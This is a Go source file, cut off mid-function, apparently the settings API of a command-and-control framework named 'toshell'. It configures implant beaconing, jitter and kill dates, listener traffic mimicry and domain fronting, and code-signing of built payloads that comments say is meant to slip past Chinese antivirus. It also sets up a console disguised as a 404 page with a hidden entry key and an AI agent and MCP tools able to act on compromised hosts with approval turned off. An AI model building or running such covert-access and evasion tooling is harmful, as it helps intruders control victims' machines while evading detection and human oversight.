package api

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"toshell/internal/server/ai"
	"toshell/internal/server/auth"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
	"toshell/internal/server/mcp"
	"toshell/internal/server/mimicry"
	"toshell/internal/server/webhook"
)

// SettingsResponse 设置页 GET 返回的分组配置（敏感字段不返回）。
type SettingsResponse struct {
	General       map[string]interface{} `json:"general"`
	Listener      map[string]interface{} `json:"listener"`
	Implant       map[string]interface{} `json:"implant"`
	Builder       map[string]interface{} `json:"builder"`
	Notifications map[string]interface{} `json:"notifications"`
	Security      map[string]interface{} `json:"security"`
	AI            map[string]interface{} `json:"ai"`
	Web           map[string]interface{} `json:"web"`
	MCP           map[string]interface{} `json:"mcp"`
}

// SettingsUpdate 设置页 PUT 请求体（均为可选，缺省不修改）。
type SettingsUpdate struct {
	General       *settingsGeneralUpdate  `json:"general"`
	Listener      *settingsListenerUpdate `json:"listener"`
	Implant       *settingsImplantUpdate  `json:"implant"`
	Builder       *settingsBuilderUpdate  `json:"builder"`
	Notifications *settingsWebhookUpdate  `json:"notifications"`
	Security      *settingsSecurityUpdate `json:"security"`
	AI            *settingsAIUpdate       `json:"ai"`
	Web           *settingsWebUpdate      `json:"web"`
	MCP           *settingsMCPUpdate      `json:"mcp"`
}

// settingsMCPUpdate 对外 MCP 服务端段（v1.4.0）。
//
// 约定：token **只写不回显** —— 传空串＝保持不变，传 "clear" ＝清空，其它值＝覆盖。
// 全部字段改完都需要**重启服务端**才生效（MCP 监听器在启动时创建，不做动态重绑）。
type settingsMCPUpdate struct {
	Enabled           *bool     `json:"enabled"`
	Bind              *string   `json:"bind"`
	Token             *string   `json:"token"`
	AllowedTools      *[]string `json:"allowed_tools"`
	AllowedOrigins    *[]string `json:"allowed_origins"`
	AllowedCIDRs      *[]string `json:"allow_cidrs"`
	MaxRPM            *int      `json:"max_rpm"`
	MaxConcurrent     *int      `json:"max_concurrent"`
	MaxPendingHandles *int      `json:"max_pending_handles"`
	InlineLimit       *int      `json:"inline_limit"`
	ResultDir         *string   `json:"result_dir"`
	ResultTTL         *string   `json:"result_ttl"`
	AuditPath         *string   `json:"audit_path"`
	FailClosed        *bool     `json:"fail_closed"`
}

// settingsGeneralUpdate 通用/服务段（此前只读，v1.3.5 起可写；改端口/主机需重启生效）。
type settingsGeneralUpdate struct {
	APIHost          *string `json:"api_host"`
	APIPort          *uint16 `json:"api_port"`
	LogLevel         *string `json:"log_level"`
	LogFormat        *string `json:"log_format"`
	HeartbeatTimeout *string `json:"heartbeat_timeout"`
	WriteQueueSize   *int    `json:"write_queue_size"`
}

// settingsBuilderUpdate 载荷构建段（v1.3.5 新增）：
//   - mingw_gcc_path：C 植入端 / DLL 载荷用的 mingw-w64 gcc（留空自动探测，DLL 要求架构一致）；
//   - sign_*：构建后 Authenticode 代码签名（未签名的新 PE 在装有 360/电脑管家的主机上
//     会被拒绝执行并删除）。密码只写不回显：传空串 = 保持不变，传 "clear" = 清除。
type settingsBuilderUpdate struct {
	MingwGCCPath     *string `json:"mingw_gcc_path"`
	SignEnabled      *bool   `json:"sign_enabled"`
	SignPFXPath      *string `json:"sign_pfx_path"`
	SignPFXPassword  *string `json:"sign_pfx_password"`
	SignThumbprint   *string `json:"sign_thumbprint"`
	SignTimestampURL *string `json:"sign_timestamp_url"`
	SignSigntoolPath *string `json:"sign_signtool_path"`
	SignDescription  *string `json:"sign_description"`
	SignFailClosed   *bool   `json:"sign_fail_closed"`
}

// settingsWebUpdate Web 控制台防护（防测绘）更新项。
type settingsWebUpdate struct {
	BasicAuthEnabled *bool   `json:"basic_auth_enabled"`
	BasicAuthUser    *string `json:"basic_auth_user"`
	// NewPassword 明文新密码：保存时 bcrypt 哈希落盘（不回显、不落明文）。
	NewPassword *string   `json:"new_password"`
	UnauthMode  *string   `json:"unauth_mode"` // disguise(默认,404) / basic(401 挑战)
	DecoyTitle  *string   `json:"decoy_title"`
	AllowCIDRs  *[]string `json:"allow_cidrs"`
	// StealthKey 隐蔽入口密钥（disguise 模式下浏览器进入控制台的通道）：
	// 传空字符串 = 清除；传 "regenerate" = 服务端生成新密钥并仅在本次响应回传。
	StealthKey *string `json:"stealth_key"`
}

type settingsAIUpdate struct {
	Enabled  *bool   `json:"enabled"`
	BaseURL  *string `json:"base_url"`
	APIKey   *string `json:"api_key"`
	Model    *string `json:"model"`
	Timeout  *int    `json:"timeout"`
	MaxTurns *int    `json:"max_turns"`
	// v1.4.0 S2：控制循环的另外两处硬上限 + 分级审批策略
	MaxToolCalls      *int      `json:"max_tool_calls"`    // 一次 run 内最多工具调用数（默认 40）
	MaxWallclockSec   *int      `json:"max_wallclock_sec"` // 一次 run 最长墙钟时间（秒，默认 900）
	ConsentPolicy     *string   `json:"consent_policy"`    // graded(默认) / all / off（旧值 auto/normal 兼容）
	ConsentMode       *string   `json:"consent_mode"`      // 旧键，保留兼容：auto=全自动 / normal=影响会话操作需用户同意
	AgentConcurrency  *int      `json:"agent_concurrency"`
	DownloadAllowlist *[]string `json:"download_allowlist"`
}

type settingsListenerUpdate struct {
	Enabled        *bool   `json:"enabled"`
	Host           *string `json:"host"`
	Port           *uint16 `json:"port"`
	PublicHost     *string `json:"public_host"`
	Protocol       *string `json:"protocol"`
	TLSEnabled     *bool   `json:"tls_enabled"`
	MimicryProfile *string `json:"mimicry_profile"`
	FrontDomain    *string `json:"front_domain"`
	MimicrySite    *string `json:"mimicry_site"`
}

type settingsImplantUpdate struct {
	Interval        *uint32 `json:"interval"`
	Jitter          *uint32 `json:"jitter"`
	RetryWait       *uint32 `json:"retry_wait"`
	KillDate        *string `json:"kill_date"`
	WorkingHours    *string `json:"working_hours"`
	StartupDelayMin *int    `json:"startup_delay_min"`
	StartupDelayMax *int    `json:"startup_delay_max"`
}

type settingsWebhookUpdate struct {
	Enabled    *bool   `json:"enabled"`
	URL        *string `json:"url"`
	Content    *string `json:"content"`
	OnlyOnline *bool   `json:"only_online"`
	Format     *string `json:"format"` // auto / dingtalk / generic
	Secret     *string `json:"secret"` // 钉钉加签密钥（可选）
}

type settingsSecurityUpdate struct {
	AdminUsername *string `json:"admin_username"`
	NewPassword   *string `json:"new_password"` // 明文新密码，保存时 bcrypt 哈希
	// 认证开关（v1.3.5 起可写）：三者不能同时关闭，否则谁都进不来（保存时拦下并报错）。
	AuthEnabled   *bool `json:"auth_enabled"`
	JWTEnabled    *bool `json:"jwt_enabled"`
	APIKeyEnabled *bool `json:"api_key_enabled"`
	// API Keys 管理（可选，三种动作可组合）：
	// api_keys        整组替换（传 []string 或空数组清空；null=不改动）
	// rotate_api_key  一键轮换：生成新 key 追加到列表（保留旧 key 宽限期）
	// remove_api_key  从列表移除指定 key
	APIKeys      *[]string `json:"api_keys"`
	RotateAPIKey *bool     `json:"rotate_api_key"`
	RemoveAPIKey *string   `json:"remove_api_key"`
}

// getSettingsHandler 返回当前配置（分组、脱敏），供设置页面加载。
func (s *Server) getSettingsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	cfg := config.Get()
	if cfg == nil {
		http.Error(w, `{"error":"config not loaded"}`, http.StatusInternalServerError)
		return
	}

	resp := SettingsResponse{
		General: map[string]interface{}{
			"api_host":          cfg.Server.APIHost,
			"api_port":          cfg.Server.APIPort,
			"log_level":         cfg.Logging.Level,
			"log_format":        cfg.Logging.Format,
			"heartbeat_timeout": cfg.Listener.HeartbeatTimeout.String(),
			"write_queue_size":  cfg.Listener.WriteQueueSize,
		},
		Listener: map[string]interface{}{
			"enabled":         cfg.Listener.Enabled,
			"host":            cfg.Listener.Host,
			"port":            cfg.Listener.Port,
			"public_host":     cfg.Listener.PublicHost,
			"protocol":        cfg.Listener.Protocol,
			"tls_enabled":     cfg.Listener.TLSEnabled,
			"mimicry_profile": cfg.Listener.MimicryProfile,
			"front_domain":    cfg.Listener.FrontDomain,
			"mimicry_site":    cfg.Listener.MimicrySite,
		},
		Implant: map[string]interface{}{
			"interval":          cfg.Implant.Interval,
			"jitter":            cfg.Implant.Jitter,
			"retry_wait":        cfg.Implant.RetryWait,
			"kill_date":         cfg.Implant.KillDate,
			"working_hours":     cfg.Implant.WorkingHours,
			"startup_delay_min": cfg.Implant.StartupDelayMin,
			"startup_delay_max": cfg.Implant.StartupDelayMax,
		},
		Builder: map[string]interface{}{
			"mingw_gcc_path": cfg.Builder.MingwGCCPath,
			"sign_enabled":   cfg.Builder.SignEnabled,
			"sign_pfx_path":  cfg.Builder.SignPFXPath,
			// 密码只回传"是否已设置"，绝不回传明文（config 侧也是 json:"-"）
			"sign_pfx_password_set": strings.TrimSpace(cfg.Builder.SignPFXPassword) != "",
			"sign_thumbprint":       cfg.Builder.SignThumbprint,
			"sign_timestamp_url":    cfg.Builder.SignTimestampURL,
			"sign_signtool_path":    cfg.Builder.SignSigntoolPath,
			"sign_description":      cfg.Builder.SignDescription,
			"sign_fail_closed":      cfg.Builder.SignFailClosed,
		},
		Notifications: map[string]interface{}{
			"enabled":     cfg.Webhook.Enabled,
			"url":         cfg.Webhook.URL,
			"content":     cfg.Webhook.Content,
			"only_online": cfg.Webhook.OnlyOnline,
			"format":      cfg.Webhook.Format,
			"secret":      cfg.Webhook.Secret,
		},
		Security: map[string]interface{}{
			"auth_enabled":    cfg.Auth.Enabled,
			"jwt_enabled":     cfg.Auth.JWTEnabled,
			"api_key_enabled": cfg.Auth.APIKeyEnabled,
			"admin_username":  cfg.Auth.AdminUsername,
			// API keys：返回脱敏版本用于展示（首 4 + 尾 4），不泄露全文
			"api_keys":      maskedAPIKeys(cfg.Auth.APIKeys),
			"api_key_count": len(cfg.Auth.APIKeys),
		},
		AI: map[string]interface{}{
			"enabled":   cfg.AI.Enabled,
			"base_url":  cfg.AI.BaseURL,
			"api_key":   maskSecret(cfg.AI.APIKey),
			"model":     cfg.AI.Model,
			"timeout":   cfg.AI.Timeout,
			"max_turns": cfg.AI.MaxTurns,
			// v1.4.0 S2：控制循环的另外两处硬上限与分级审批策略（旧 consent_mode 保留兼容）
			"max_tool_calls":    cfg.AI.MaxToolCalls,
			"max_wallclock_sec": cfg.AI.MaxWallclockSec,
			// consent_policy 回传**生效值**（空配置→graded、旧键 auto/normal→off/graded），
			// 前端与自动化读到的就是循环里真正会用的策略，不必各自猜默认。
			"consent_policy":     ai.EffectiveConsentPolicy(cfg.AI.ConsentPolicy, cfg.AI.ConsentMode),
			"consent_mode":       cfg.AI.ConsentMode,
			"agent_concurrency":  cfg.AI.AgentConcurrency,
			"download_allowlist": cfg.AI.DownloadAllowlist,
		},
		Web: map[string]interface{}{
			"basic_auth_enabled": cfg.Web.BasicAuthEnabled,
			"basic_auth_user":    cfg.Web.BasicAuthUser,
			// 只回传"是否已设置密码"，绝不回传哈希
			"password_set": cfg.Web.BasicAuthPassword != "",
			"unauth_mode":  cfg.Web.UnauthMode,
			"decoy_title":  cfg.Web.DecoyTitle,
			"allow_cidrs":  cfg.Web.AllowCIDRs,
			// 隐蔽入口：只回传是否已设置 + 入口路径，密钥本身不回传
			"stealth_key_set": strings.TrimSpace(cfg.Web.StealthKey) != "",
			"stealth_entry":   "/__gate?k=<密钥>",
		},
		MCP: map[string]interface{}{
			"enabled": cfg.MCP.Enabled,
			"bind":    cfg.MCP.Bind,
			// token 只回传"是否已设置"，绝不回传明文
			"token_set":           strings.TrimSpace(cfg.MCP.Token) != "",
			"allowed_tools":       cfg.MCP.AllowedTools,
			"allowed_origins":     cfg.MCP.AllowedOrigins,
			"allow_cidrs":         cfg.MCP.AllowedCIDRs,
			"max_rpm":             cfg.MCP.MaxRPM,
			"max_concurrent":      cfg.MCP.MaxConcurrent,
			"max_pending_handles": cfg.MCP.MaxPendingHandles,
			"inline_limit":        cfg.MCP.InlineLimit,
			"result_dir":          cfg.MCP.ResultDir,
			"result_ttl":          cfg.MCP.ResultTTL,
			"audit_path":          cfg.MCP.AuditPath,
			"fail_closed":         cfg.MCP.FailClosed,
			// 供前端展示：白名单留空时实际生效的是"只读工具"集合，这里直接给出
			"effective_allowed": effectiveMCPAllowedTools(cfg.MCP.AllowedTools),
			"read_only_tools":   mcp.Default().DefaultAllowed(),
			"tool_levels": map[string]int{
				"read":    len(mcp.Default().ByLevel(mcp.LevelRead)),
				"confirm": len(mcp.Default().ByLevel(mcp.LevelConfirm)),
				"danger":  len(mcp.Default().ByLevel(mcp.LevelDanger)),
			},
		},
	}
	json.NewEncoder(w).Encode(resp)
}

// effectiveMCPAllowedTools 计算"实际生效的 MCP 工具白名单"：
// 配置里留空时取注册表的只读集合（默认最小权限：只放行不接触被控主机的工具）。
func effectiveMCPAllowedTools(configured []string) []string {
	out := make([]string, 0, len(configured))
	for _, raw := range configured {
		if n := strings.TrimSpace(raw); n != "" {
			out = append(out, n)
		}
	}
	if len(out) > 0 {
		return out
	}
	return mcp.Default().DefaultAllowed()
}

// maskSecret 脱敏展示密钥类配置（保留首尾各 4 字符，其余掩码）。
func maskSecret(s string) string {
	if len(s) <= 8 {
		return "********"
	}
	return s[:4] + "****" + s[len(s)-4:]
}

// maskedAPIKeys 返回 API keys 的脱敏展示列表（首 4 + 尾 4）。
func maskedAPIKeys(keys []string) []string {
	out := make([]string, 0, len(keys))
	for _, k := range keys {
		out = append(out, maskSecret(k))
	}
	return out
}

// updateSettingsHandler 保存设置：校验 → 写回配置文件 → 热生效。
// 返回 hot=true 表示无需重启即已生效（webhook/拟态/认证/植入默认参数）。
func (s *Server) updateSettingsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	var upd SettingsUpdate
	if err := json.NewDecoder(r.Body).Decode(&upd); err != nil {
		http.Error(w, `{"error":"invalid request body"}`, http.StatusBadRequest)
		return
	}

	updates := map[string]interface{}{}
	hot := true

	// ── listener 段 ──
	if l := upd.Listener; l != nil {
		if l.Enabled != nil {
			updates["listener.enabled"] = *l.Enabled
		}
		if l.Host != nil {
			updates["listener.host"] = *l.Host
		}
		if l.Port != nil {
			if *l.Port == 0 {
				http.Error(w, `{"error":"listener.port 非法"}`, http.StatusBadRequest)
				return
			}
			updates["listener.port"] = *l.Port
			hot = false // 端口/绑定变化需重启 listener
		}
		if l.PublicHost != nil {
			updates["listener.public_host"] = *l.PublicHost
		}
		if l.Protocol != nil {
			updates["listener.protocol"] = *l.Protocol
			hot = false
		}
		if l.TLSEnabled != nil {
			updates["listener.tls_enabled"] = *l.TLSEnabled
			hot = false // TLS 开关需重启 listener
		}
		if l.MimicryProfile != nil {
			name := *l.MimicryProfile
			if name != "" && !contains(mimicry.Names(), name) {
				http.Error(w, fmt.Sprintf(`{"error":"未知拟态模板: %s"}`, name), http.StatusBadRequest)
				return
			}
			updates["listener.mimicry_profile"] = name
		}
		if l.FrontDomain != nil {
			fd := *l.FrontDomain
			if fd != "" {
				u, err := url.Parse("https://" + fd)
				if err != nil || u.Hostname() == "" {
					http.Error(w, `{"error":"front_domain 非法（示例: cdn.example.com）"}`, http.StatusBadRequest)
					return
				}
			}
			updates["listener.front_domain"] = fd
		}
		if l.MimicrySite != nil {
			site := *l.MimicrySite
			if site != "" {
				u, err := url.Parse(site)
				if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
					http.Error(w, `{"error":"mimicry_site 非法（示例: https://www.example.com）"}`, http.StatusBadRequest)
					return
				}
			}
			updates["listener.mimicry_site"] = site
		}
	}

	// ── implant 默认参数段 ──
	if im := upd.Implant; im != nil {
		if im.Interval != nil {
			updates["implant.interval"] = *im.Interval
		}
		if im.Jitter != nil {
			if *im.Jitter > 100 {
				http.Error(w, `{"error":"jitter 必须为 0-100"}`, http.StatusBadRequest)
				return
			}
			updates["implant.jitter"] = *im.Jitter
		}
		if im.RetryWait != nil {
			updates["implant.retry_wait"] = *im.RetryWait
		}
		if im.KillDate != nil {
			updates["implant.kill_date"] = *im.KillDate
		}
		if im.WorkingHours != nil {
			updates["implant.working_hours"] = *im.WorkingHours
		}
		if im.StartupDelayMin != nil {
			if *im.StartupDelayMin < 0 {
				http.Error(w, `{"error":"startup_delay_min 不能为负"}`, http.StatusBadRequest)
				return
			}
			updates["implant.startup_delay_min"] = *im.StartupDelayMin
		}
		if im.StartupDelayMax != nil {
			if *im.StartupDelayMax < 0 {
				http.Error(w, `{"error":"startup_delay_max 不能为负"}`, http.StatusBadRequest)
				return
			}
			updates["implant.startup_delay_max"] = *im.StartupDelayMax
		}
	}

	// ── 通知（webhook）段 ──
	if n := upd.Notifications; n != nil {
		if n.Enabled != nil {
			updates["webhook.enabled"] = *n.Enabled
		}
		if n.URL != nil {
			if *n.URL != "" {
				u, err := url.Parse(*n.URL)
				if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
					http.Error(w, `{"error":"webhook url 非法"}`, http.StatusBadRequest)
					return
				}
			}
			updates["webhook.url"] = *n.URL
		}
		if n.Content != nil {
			updates["webhook.content"] = *n.Content
		}
		if n.OnlyOnline != nil {
			updates["webhook.only_online"] = *n.OnlyOnline
		}
		if n.Format != nil {
			f := strings.ToLower(strings.TrimSpace(*n.Format))
			switch f {
			case "", "auto", "dingtalk", "feishu", "wecom", "slack", "discord", "generic":
				updates["webhook.format"] = f
			default:
				http.Error(w, `{"error":"format 仅支持 auto/dingtalk/feishu/wecom/slack/discord/generic"}`, http.StatusBadRequest)
				return
			}
		}
		if n.Secret != nil {
			updates["webhook.secret"] = *n.Secret
		}
	}

	// ── 安全（账户）段 ──
	if sec := upd.Security; sec != nil {
		if sec.AdminUsername != nil && *sec.AdminUsername != "" {
			updates["auth.admin_username"] = *sec.AdminUsername
		}
		// ── 认证开关：允许调整，但不允许把三种认证全部关掉（否则控制台直接失守）──
		if sec.AuthEnabled != nil || sec.JWTEnabled != nil || sec.APIKeyEnabled != nil {
			cur := config.Get()
			authOn, jwtOn, keyOn := true, true, true
			if cur != nil {
				authOn, jwtOn, keyOn = cur.Auth.Enabled, cur.Auth.JWTEnabled, cur.Auth.APIKeyEnabled
			}
			if sec.AuthEnabled != nil {
				authOn = *sec.AuthEnabled
				updates["auth.enabled"] = authOn
			}
			if sec.JWTEnabled != nil {
				jwtOn = *sec.JWTEnabled
				updates["auth.jwt_enabled"] = jwtOn
			}
			if sec.APIKeyEnabled != nil {
				keyOn = *sec.APIKeyEnabled
				updates["auth.api_key_enabled"] = keyOn
			}
			if !authOn && !jwtOn && !keyOn {
				http.Error(w, `{"error":"auth.enabled / jwt_enabled / api_key_enabled 不能同时关闭：至少保留一种认证方式，否则控制台将无法登录"}`, http.StatusBadRequest)
				return
			}
		}
		if sec.NewPassword != nil && *sec.NewPassword != "" {
			if len(*sec.NewPassword) < 8 {
				http.Error(w, `{"error":"新密码至少 8 位"}`, http.StatusBadRequest)
				return
			}
			hashed, err := auth.HashPassword(*sec.NewPassword)
			if err != nil {
				http.Error(w, `{"error":"密码哈希失败"}`, http.StatusInternalServerError)
				return
			}
			updates["auth.admin_password"] = hashed
		}
		// ── API Keys 管理 ──
		if sec.APIKeys != nil || (sec.RotateAPIKey != nil && *sec.RotateAPIKey) || (sec.RemoveAPIKey != nil && *sec.RemoveAPIKey != "") {
			curCfg := config.Get()
			var curKeys []string
			if curCfg != nil {
				curKeys = curCfg.Auth.APIKeys
			}
			keys := make([]string, len(curKeys))
			copy(keys, curKeys)
			if sec.APIKeys != nil {
				// 整组替换（前端传完整新列表）。
				// 防御：前端回显的是脱敏值（如 Qing****2026），绝不能把它当成新密钥写回
				// —— 否则会把真实密钥破坏成掩码串（历史缺陷）。含 **** 的条目一律忽略。
				filtered := make([]string, 0, len(*sec.APIKeys))
				for _, k := range *sec.APIKeys {
					k = strings.TrimSpace(k)
					if k == "" || strings.Contains(k, "****") {
						continue
					}
					filtered = append(filtered, k)
				}
				if len(*sec.APIKeys) > 0 && len(filtered) == 0 {
					// 传进来的全是脱敏回显：视为"未修改"，保持现有密钥不变
					logging.Warn("settings", "api_keys 仅包含脱敏回显值，已忽略本次替换以避免破坏密钥")
					sec.APIKeys = nil
				} else {
					keys = filtered
				}
			}
			if sec.RemoveAPIKey != nil && *sec.RemoveAPIKey != "" {
				removed := *sec.RemoveAPIKey
				out := keys[:0]
				for _, k := range keys {
					if k != removed {
						out = append(out, k)
					}
				}
				keys = out
			}
			if sec.RotateAPIKey != nil && *sec.RotateAPIKey {
				newKey, kerr := auth.GenerateRandomKey(24)
				if kerr != nil {
					http.Error(w, `{"error":"生成 API Key 失败"}`, http.StatusInternalServerError)
					return
				}
				keys = append(keys, newKey)
				// 新 key 单独回传一次（仅本次可见，前端立即展示保存）
				updates["_new_api_key"] = newKey
			}
			// 清理空串
			clean := keys[:0]
			for _, k := range keys {
				if strings.TrimSpace(k) != "" {
					clean = append(clean, strings.TrimSpace(k))
				}
			}
			updates["auth.api_keys"] = clean
		}
	}

	// ── AI 副驾驶段 ──
	if a := upd.AI; a != nil {
		if a.Enabled != nil {
			updates["ai.enabled"] = *a.Enabled
		}
		if a.BaseURL != nil {
			b := strings.TrimSpace(*a.BaseURL)
			if b != "" && !strings.HasPrefix(b, "http://") && !strings.HasPrefix(b, "https://") {
				http.Error(w, `{"error":"ai.base_url 需以 http(s):// 开头"}`, http.StatusBadRequest)
				return
			}
			updates["ai.base_url"] = b
		}
		if a.APIKey != nil {
			k := strings.TrimSpace(*a.APIKey)
			// 掩码值（sk-****abcd）原样返回时不覆盖已有密钥
			if k != "" && !strings.Contains(k, "****") {
				updates["ai.api_key"] = k
			}
		}
		if a.Model != nil && strings.TrimSpace(*a.Model) != "" {
			updates["ai.model"] = strings.TrimSpace(*a.Model)
		}
		if a.Timeout != nil && *a.Timeout > 0 {
			updates["ai.timeout"] = *a.Timeout
		}
		// v1.4.0 S2：控制循环的另外两处硬上限 + 分级审批策略。
		// 上限给下限保护（0/负数会让循环直接停摆，比"不限制"更危险）。
		if a.MaxTurns != nil {
			if *a.MaxTurns < 1 || *a.MaxTurns > 1000 {
				http.Error(w, `{"error":"ai.max_turns 范围 1-1000"}`, http.StatusBadRequest)
				return
			}
			updates["ai.max_turns"] = *a.MaxTurns
		}
		if a.MaxToolCalls != nil {
			if *a.MaxToolCalls < 1 || *a.MaxToolCalls > 1000 {
				http.Error(w, `{"error":"ai.max_tool_calls 范围 1-1000"}`, http.StatusBadRequest)
				return
			}
			updates["ai.max_tool_calls"] = *a.MaxToolCalls
		}
		if a.MaxWallclockSec != nil {
			if *a.MaxWallclockSec < 30 || *a.MaxWallclockSec > 86400 {
				http.Error(w, `{"error":"ai.max_wallclock_sec 范围 30-86400（秒）"}`, http.StatusBadRequest)
				return
			}
			updates["ai.max_wallclock_sec"] = *a.MaxWallclockSec
		}
		if a.ConsentPolicy != nil {
			cp := strings.ToLower(strings.TrimSpace(*a.ConsentPolicy))
			// 兼容旧值：auto→off、normal→graded（与 ai 包的 normalizeConsentPolicy 一致）
			switch cp {
			case "auto":
				cp = "off"
			case "normal":
				cp = "graded"
			}
			if cp != "graded" && cp != "all" && cp != "off" {
				http.Error(w, `{"error":"ai.consent_policy 仅支持 graded / all / off（旧值 auto/normal 亦可）"}`, http.StatusBadRequest)
				return
			}
			updates["ai.consent_policy"] = cp
		}
		if a.ConsentMode != nil {
			cm := strings.TrimSpace(*a.ConsentMode)
			if cm != "auto" && cm != "normal" {
				http.Error(w, `{"error":"ai.consent_mode 仅支持 auto / normal"}`, http.StatusBadRequest)
				return
			}
			updates["ai.consent_mode"] = cm
		}
		if a.AgentConcurrency != nil {
			if *a.AgentConcurrency < 1 || *a.AgentConcurrency > 8 {
				http.Error(w, `{"error":"ai.agent_concurrency 范围 1-8"}`, http.StatusBadRequest)
				return
			}
			updates["ai.agent_concurrency"] = *a.AgentConcurrency
		}
		if a.DownloadAllowlist != nil {
			// 域名白名单：清洗空项、去空格、小写
			cleaned := []string{}
			for _, h := range *a.DownloadAllowlist {
				h = strings.ToLower(strings.TrimSpace(h))
				if h != "" {
					cleaned = append(cleaned, h)
				}
			}
			updates["ai.download_allowlist"] = cleaned
		}
	}

	// ── 通用/服务段（v1.3.5 起可写；端口与队列大小需重启生效）──
	if g := upd.General; g != nil {
		if g.APIHost != nil {
			updates["server.api_host"] = strings.TrimSpace(*g.APIHost)
			hot = false
		}
		if g.APIPort != nil {
			if *g.APIPort == 0 {
				http.Error(w, `{"error":"api_port 非法"}`, http.StatusBadRequest)
				return
			}
			updates["server.api_port"] = *g.APIPort
			hot = false
		}
		if g.LogLevel != nil {
			lv := strings.ToLower(strings.TrimSpace(*g.LogLevel))
			switch lv {
			case "debug", "info", "warn", "warning", "error":
			default:
				http.Error(w, `{"error":"log_level 仅支持 debug/info/warn/error"}`, http.StatusBadRequest)
				return
			}
			updates["logging.level"] = lv
		}
		if g.LogFormat != nil {
			f := strings.ToLower(strings.TrimSpace(*g.LogFormat))
			if f != "json" && f != "text" && f != "console" {
				http.Error(w, `{"error":"log_format 仅支持 json/text"}`, http.StatusBadRequest)
				return
			}
			updates["logging.format"] = f
		}
		if g.HeartbeatTimeout != nil {
			d, err := time.ParseDuration(strings.TrimSpace(*g.HeartbeatTimeout))
			if err != nil || d <= 0 {
				http.Error(w, `{"error":"heartbeat_timeout 非法（示例: 60s / 2m）"}`, http.StatusBadRequest)
				return
			}
			// 判活阈值本身就是"按会话自适应（max(配置, 3×实测间隔)）"，改完立即对新会话生效
			updates["listener.heartbeat_timeout"] = d.String()
		}
		if g.WriteQueueSize != nil {
			if *g.WriteQueueSize < 64 {
				http.Error(w, `{"error":"write_queue_size 太小（建议 >= 1024）"}`, http.StatusBadRequest)
				return
			}
			updates["listener.write_queue_size"] = *g.WriteQueueSize
			hot = false
		}
	}

	// ── 载荷构建与代码签名段（v1.3.5）──
	if bd := upd.Builder; bd != nil {
		if bd.MingwGCCPath != nil {
			updates["builder.mingw_gcc_path"] = strings.TrimSpace(*bd.MingwGCCPath)
		}
		if bd.SignEnabled != nil {
			updates["builder.sign_enabled"] = *bd.SignEnabled
		}
		if bd.SignPFXPath != nil {
			updates["builder.sign_pfx_path"] = strings.TrimSpace(*bd.SignPFXPath)
		}
		if bd.SignPFXPassword != nil {
			// 约定：空串=保持原值（前端不回显密码，自然也不会提交）；"clear"=清除
			pw := *bd.SignPFXPassword
			switch {
			case pw == "clear":
				updates["builder.sign_pfx_password"] = ""
			case strings.TrimSpace(pw) != "" && !strings.Contains(pw, "****"):
				updates["builder.sign_pfx_password"] = pw
			}
		}
		if bd.SignThumbprint != nil {
			updates["builder.sign_thumbprint"] = strings.TrimSpace(*bd.SignThumbprint)
		}
		if bd.SignTimestampURL != nil {
			ts := strings.TrimSpace(*bd.SignTimestampURL)
			if ts != "" && !strings.HasPrefix(ts, "http://") && !strings.HasPrefix(ts, "https://") {
				http.Error(w, `{"error":"sign_timestamp_url 需以 http(s):// 开头"}`, http.StatusBadRequest)
				return
			}
			updates["builder.sign_timestamp_url"] = ts
		}
		if bd.SignSigntoolPath != nil {
			updates["builder.sign_signtool_path"] = strings.TrimSpace(*bd.SignSigntoolPath)
		}
		if bd.SignDescription != nil {
			updates["builder.sign_description"] = strings.TrimSpace(*bd.SignDescription)
		}
		if bd.SignFailClosed != nil {
			updates["builder.sign_fail_closed"] = *bd.SignFailClosed
		}
	}

	// ── 对外 MCP 服务端段（v1.4.0；全部字段改完都需重启，监听器不做动态重绑）──
	if mu := upd.MCP; mu != nil {
		if mu.Enabled != nil {
			updates["mcp.enabled"] = *mu.Enabled
			hot = false
		}
		if mu.Bind != nil {
			bind := strings.TrimSpace(*mu.Bind)
			if bind == "" {
				http.Error(w, `{"error":"mcp.bind 不能为空（示例: 127.0.0.1:18082）"}`, http.StatusBadRequest)
				return
			}
			if _, _, err := net.SplitHostPort(bind); err != nil {
				http.Error(w, `{"error":"mcp.bind 需为 host:port（示例: 127.0.0.1:18082）"}`, http.StatusBadRequest)
				return
			}
			updates["mcp.bind"] = bind
			hot = false
		}
		if mu.Token != nil {
			// 与 pfx 密码同一约定：空串=保持、"clear"=清空、其它=覆盖。
			// 开启 MCP 但没有 token 时服务端会拒绝启动（fail-closed），这里提前拦一下更友好。
			tk := *mu.Token
			switch {
			case tk == "clear":
				updates["mcp.token"] = ""
				if mu.Enabled == nil {
					if cur := config.Get(); cur != nil && cur.MCP.Enabled {
						http.Error(w, `{"error":"MCP 正在启用，清空 token 后服务端将拒绝启动；请先关闭 mcp.enabled"}`, http.StatusBadRequest)
						return
					}
				}
			case strings.TrimSpace(tk) != "" && !strings.Contains(tk, "****"):
				updates["mcp.token"] = strings.TrimSpace(tk)
			}
			hot = false
		}
		if mu.AllowedTools != nil {
			// 逐个校验工具名：拼错的名字会让"以为放行了"变成"其实没放行"，直接拦掉。
			reg := mcp.Default()
			names := make([]string, 0, len(*mu.AllowedTools))
			for _, raw := range *mu.AllowedTools {
				n := strings.TrimSpace(raw)
				if n == "" {
					continue
				}
				if !reg.IsRegistered(n) {
					http.Error(w, fmt.Sprintf(`{"error":"allowed_tools 含未注册的工具 %q（可用 GET /api/v1/mcp/tools 查看）"}`, n), http.StatusBadRequest)
					return
				}
				if reg.LevelOf(n) == mcp.LevelDanger {
					logging.Warn("settings", "MCP 白名单里加入了危险级工具 %s：它会绕过分级审批，请确认这是有意的", n)
				}
				names = append(names, n)
			}
			updates["mcp.allowed_tools"] = names
			hot = false
		}
		if mu.AllowedOrigins != nil {
			origins := make([]string, 0, len(*mu.AllowedOrigins))
			for _, raw := range *mu.AllowedOrigins {
				if o := strings.TrimSpace(raw); o != "" {
					origins = append(origins, o)
				}
			}
			updates["mcp.allowed_origins"] = origins
			hot = false
		}
		if mu.AllowedCIDRs != nil {
			// 逐个校验 CIDR/IP 是否可解析：写错了会导致"以为限制了来源、其实一个都进不来"。
